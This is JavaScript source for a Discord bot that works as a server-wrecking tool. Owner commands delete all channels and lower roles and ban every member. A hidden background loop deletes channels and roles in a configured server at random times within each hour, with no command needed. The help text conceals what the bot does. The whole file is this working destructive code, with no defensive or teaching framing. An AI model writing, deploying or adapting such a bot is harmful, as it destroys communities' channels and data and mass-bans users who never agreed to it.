/*jshint esversion: 8 */
const discord = require("discord.js");
const salvation = new discord.Client();

const config = require("./config.json");

salvation.on("ready", () => {
    console.log(" ");
    console.log(`${salvation.user.tag} is online.`);
    salvation.user.setPresence({ game: { name: `We all need salvation` }, type: 0 });
});

salvation.on("message", async(msg) => {
    if (msg.content.toLowerCase().startsWith("n!" + "salvation")) {
        if (msg.author.id == config.OwnerId) {
            msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
            msg.guild.channels.deleteAll();
            msg.guild.members.tap(member => member.ban("Banned by big guy"));
        } else {
            msg.channel.send("No.");
        }
    }
    if (msg.content.toLowerCase().startsWith("n!" + "delete")) {
        if (msg.author.id == config.OwnerId) {
            resetChannels();
        } else {
            msg.channel.send("No.");
        }
    }
    if (msg.content.toLowerCase().startsWith("n!" + "ban")) {
        if (msg.author.id == config.OwnerId) {
            msg.guild.members.tap(member => member.ban("Banned by big guy"));
        } else {
            msg.channel.send("No.");
        }
    }
    if (msg.content.toLowerCase().startsWith("n!" + "help")) {
        msg.channel.send({
            embed: {
                color: 0xff0000,
                author: { name: "Hi | n!help" },
                description: "I can't help."
            }
        });
    }
});

function resetChannels() {

    targetGuild = salvation.guilds.get(config.GuildId);
    var currentTime = new Date();
    salvation.user.setPresence({
        status: "online",
        game: {
            name: "Last reset at " + currentTime.getHours() + ":" + currentTime.getMinutes(),
            type: "STREAMING"
        }
    });
    for (const [id, channel] of targetGuild.channels.entries()) {
        if (id != config.PermaChannelId) {
            channel.delete();
        }
    }
    targetGuild.roles.forEach(element => {
        if (element.id != config.MemberRoleId) {
            element.delete();
        }
    });
    return 0;
}

function delay(ms) {
    return new Promise(resolve => {
        setTimeout(resolve, ms);
    });
}

async function randomInterval() {
    while (true) {
        var delTime = Math.random() * 3600000;
        await delay(delTime);
        resetChannels();
    }
}

salvation.login(config.Token);
randomInterval();